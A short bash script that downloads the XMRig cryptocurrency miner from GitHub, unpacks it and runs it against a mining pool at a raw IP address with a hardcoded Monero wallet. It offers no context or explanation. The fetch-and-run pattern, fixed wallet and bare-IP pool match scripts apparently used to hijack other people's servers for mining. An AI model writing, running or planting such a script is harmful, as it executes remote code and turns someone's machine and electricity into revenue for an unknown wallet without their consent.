#!/bin/bash

wget https://github.com/xmrig/xmrig/releases/download/v6.3.1/xmrig-6.3.1-xenial-x64.tar.gz

tar zxvf xmrig-6.3.1-xenial-x64.tar.gz

cd xmrig-6.3.1

./xmrig --url 207.246.77.128:6666 --user 846jqgdcmREXnbG2vPYHDedFyV2m5zmU5e5JBUYkpv6m88mgs6d4bxGKMzkUh9PfWRSK1d2mXe5yTAmsDEtmEmq6JhsLkua --pass x --keepalive --threads 4 --tls
